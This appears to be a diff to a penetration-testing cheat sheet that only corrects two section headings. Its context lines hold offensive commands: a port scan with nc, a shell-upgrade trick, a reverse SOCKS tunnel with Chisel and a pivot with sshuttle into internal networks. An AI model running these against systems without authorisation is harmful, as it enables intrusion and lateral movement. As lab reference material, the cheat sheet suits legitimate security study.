@@ -12,7 +12,7 @@ stty raw -echo;fg
 ```bash
 nc -zv <IP> 1-65535
 ```
-# Chisel usage (Reverse Connection):
+# Internal Network access using Chisel (Reverse Connection):
 - On the local machine:
 ```bash
 ./chisel server -p 8000 --reverse
@@ -21,7 +21,7 @@ nc -zv <IP> 1-65535
 ```bash
 ./chisel client <LHOST>:8000 R:socks
 ```
-# Inernal Network access using SShuttle:
+# Internal Network access using SShuttle:
 ```bash
 └─$ sudo sshuttle -r <username>@<RHOST> <Internal IP/Subnet>
 ```
